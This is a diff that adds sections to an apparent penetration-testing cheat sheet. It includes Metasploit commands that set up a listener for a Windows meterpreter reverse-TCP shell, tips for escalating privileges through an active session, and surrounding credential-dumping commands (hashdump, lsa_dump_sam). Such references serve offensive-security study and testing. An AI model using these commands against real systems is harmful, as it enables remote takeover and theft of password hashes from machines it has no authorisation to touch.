@@ -225,3 +225,22 @@ hashdump
 // OR
 lsa_dump_sam
 ```
+
+## msf - setting up a listener the correct way
+```
+# MSF - Listener
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/(optionalx32 or x64)/meterpreter/reverse_tcp
+Important : the architecture should match the one used to generate the meterpreter using msfvenom.
+msf exploit(handler) > set LHOST 192.168.0.100
+msf exploit(handler) > set LPORT 4444
+msf exploit(handler) > set ExitOnSession false
+msf exploit(handler) > exploit -j
+```
+
+## msf - tips for LPE/use of exploit through a meterpreter session
+```
+Tips for LPE/use of exploit through a meterpreter session
+1. Once a meterpreter session has been established, you can use msf's exploit module to privesc locally.
+2. Usually, the exploit prompt you to use an active meterpreter session. Use the one matching the machine to pwn.
+```
